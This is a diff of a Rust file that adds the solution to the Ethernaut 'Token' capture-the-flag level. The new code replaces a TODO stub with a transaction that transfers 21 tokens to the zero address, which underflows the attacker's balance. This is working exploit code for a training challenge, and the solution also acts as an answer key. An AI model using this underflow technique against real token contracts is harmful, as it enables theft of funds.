@@ -5,6 +5,7 @@
 //!
 //! https://github.com/OpenZeppelin/ethernaut/blob/d05643a/contracts/src/levels/Token.sol
 
+use alloy::primitives::{Address, U256};
 use async_trait::async_trait;
 use ctf::Actor;
 use ctf::ethereum::ethernaut::lvl05_token::*;
@@ -20,8 +21,14 @@ impl ctf::Exploit for Exploit {
         target: &Self::Target,
         offender: &Actor,
     ) -> eyre::Result<()> {
-        // TODO: exploit the level
-        let _ = (target, offender);
+        let contract = Token::new(target.address, offender.provider());
+        contract
+            .transfer(Address::ZERO, U256::from(21))
+            .from(offender.address())
+            .send()
+            .await?
+            .watch()
+            .await?;
         Ok(())
     }
 }
